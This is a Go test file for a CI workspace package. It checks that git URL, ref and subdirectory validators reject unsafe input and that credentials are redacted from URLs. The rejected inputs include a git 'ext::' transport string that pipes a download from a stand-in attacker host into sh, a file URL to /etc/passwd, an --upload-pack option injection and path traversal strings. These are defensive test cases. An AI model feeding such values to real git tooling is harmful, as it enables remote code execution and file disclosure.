package materialize

import "testing"

// A workspace source must never reach git's command-executing
// transports, and neither the ref nor the subdir may turn into an
// option or escape the checkout.
func TestValidateGitUrl(t *testing.T) {
	bad := []string{
		"ext::sh -c 'curl attacker.example|sh'",
		"file:///etc/passwd",
		"--upload-pack=sh",
		"ssh://git@example.com/x.git", // not supported yet
		"",
		"github.com/x/y", // no scheme
	}
	for _, u := range bad {
		if err := validateGitURL(u); err == nil {
			t.Fatalf("url %q must be refused", u)
		}
	}
	for _, u := range []string{"https://github.com/graphene-ci/examples", "http://gitea.internal:3000/team/pipe.git"} {
		if err := validateGitURL(u); err != nil {
			t.Fatalf("url %q must be accepted: %v", u, err)
		}
	}
}

func TestValidateGitRef(t *testing.T) {
	for _, r := range []string{"--upload-pack=sh", "-x", "a b", "a..b", "re:f"} {
		if err := validateGitRef(r); err == nil {
			t.Fatalf("ref %q must be refused", r)
		}
	}
	for _, r := range []string{"", "main", "v1.2.3", "release/2026-08", "4f2b8f98136bf1c7166899d9d06d2ad12e272684"} {
		if err := validateGitRef(r); err != nil {
			t.Fatalf("ref %q must be accepted: %v", r, err)
		}
	}
}

func TestValidateSubdir(t *testing.T) {
	for _, d := range []string{"../etc", "pipelines/../../etc", "-x"} {
		if err := validateSubdir(d); err == nil {
			t.Fatalf("subdir %q must be refused", d)
		}
	}
	for _, d := range []string{"", "full", "pipelines/delivery", "/full/"} {
		if err := validateSubdir(d); err != nil {
			t.Fatalf("subdir %q must be accepted: %v", d, err)
		}
	}
}

// A credential embedded in a URL must never reach a log line.
func TestRedact(t *testing.T) {
	got := redact("https://ghp_secret:x-oauth-basic@github.com/org/repo")
	if got != "https://***@github.com/org/repo" {
		t.Fatalf("credential survived redaction: %s", got)
	}
}
